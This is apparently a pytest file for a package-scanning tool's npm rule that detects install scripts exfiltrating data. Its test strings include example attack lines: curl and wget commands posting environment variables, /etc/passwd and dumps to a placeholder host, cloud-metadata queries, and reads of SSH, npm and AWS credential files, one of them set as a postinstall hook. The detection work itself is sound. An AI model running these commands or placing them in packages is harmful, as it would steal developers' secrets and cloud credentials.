"""`npm.install-script-exfil` on small, inert install scripts (strings only: nothing here runs,
and no URL in them is real)."""

import json

import pytest

from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
from kitsunox.ecosystems.npm.install import install_sources
from kitsunox.ecosystems.npm.rules.install_loader import (
    EXFIL_SHAPES,
    InstallScriptExfil,
    InstallScriptLoader,
    loader_shapes,
)
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
EXFIL = InstallScriptExfil()


def hooked(files: dict[str, bytes], hook: str, base: dict[str, bytes] | None = None) -> CodeChange:
    meta = {"scripts": {"postinstall": hook}}
    tree = {"package.json": json.dumps(meta).encode(), **files}
    old = None if base is None else {"package.json": json.dumps(meta).encode(), **base}
    snap = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
        publish=PublishInfo(),
        manifest=meta,
    )
    return code_change(snap, tree, old, CACHE, install_sources, "1.0.0" if old else None)


def exfil(path: str, code: str) -> list[str]:
    return [shape for shape, *_ in loader_shapes({path: code.encode()}, {}, EXFIL_SHAPES)]


@pytest.mark.parametrize(
    ("code", "shape"),
    [
        (
            "{ env; git config --global --list; } \\\n"
            '  | curl -s -X POST "https://x.invalid/e" --data-binary @- &\n',
            "upload-output",
        ),
        (
            "tar -czf - /etc/passwd | base64 | curl -X POST -d @- https://x.invalid\n",
            "upload-output",
        ),
        ('curl -X POST -F "file=@/etc/passwd" http://x.invalid\n', "upload-file"),
        ("curl -T ./dump.tgz https://x.invalid/u\n", "upload-file"),
        ("wget --post-file=/etc/hosts http://x.invalid\n", "upload-file"),
        ('MD="http://metadata.google.internal/computeMetadata/v1"\n', "cloud-metadata"),
        ("curl -s http://169.254.169.254/latest/meta-data/iam/\n", "cloud-metadata"),
        ("ln -s ~/.ssh/id_ed25519 ./tmp/index.txt\n", "credential-files"),
        ("cat $HOME/.npmrc\n", "credential-files"),
        ("cp ~/.aws/credentials /tmp/x\n", "credential-files"),
    ],
)
def test_exfil_shapes(code: str, shape: str) -> None:
    assert exfil("a.sh", code) == [shape]


@pytest.mark.parametrize(
    "code",
    [
        "cp .npmrc.example .npmrc\n",  # the project's own file
        "curl -s -d '{\"v\": 1}' https://x.invalid/ping\n",
        "curl -fsSL -o tool.tgz https://x.invalid/tool.tgz\n",
        "while read -r l; do unset x; done < <(env)\n",
        "echo 'never copy ~/.ssh/id_rsa anywhere'\n",
    ],
)
def test_ordinary_scripts_are_not_exfil(code: str) -> None:
    assert exfil("a.sh", code) == []


def test_exfil_rule() -> None:
    """`ts-form-helpers@1.0.3` (`vm-day1`, malicious): `bash scripts/setup.sh` sends the
    environment away; nothing else reported it."""
    script = {
        "scripts/setup.sh": b"{ env; } | curl -s -X POST https://x.invalid/e --data-binary @- &\n"
    }
    change = hooked(script, "bash scripts/setup.sh")
    (finding,) = EXFIL.evaluate_code(change)
    assert (finding.rule_id, finding.severity, finding.weight) == (
        "npm.install-script-exfil",
        Severity.MEDIUM,
        3.0,
    )
    assert "pipes command output into an upload" in finding.explanation
    assert InstallScriptLoader().evaluate_code(change) == ()  # not a loader
    assert EXFIL.evaluate_code(hooked(script, "bash scripts/setup.sh", base=script)) == ()


def test_exfil_on_a_hook_line() -> None:
    change = hooked({}, 'curl -X POST -F "file=@/etc/passwd" http://x.invalid')
    (finding,) = EXFIL.evaluate_code(change)
    assert finding.evidence[0].path == "package.json:scripts.postinstall"


def test_no_script_no_finding() -> None:
    assert EXFIL.evaluate_code(hooked({"setup.sh": b"echo ok\n"}, "sh setup.sh")) == ()
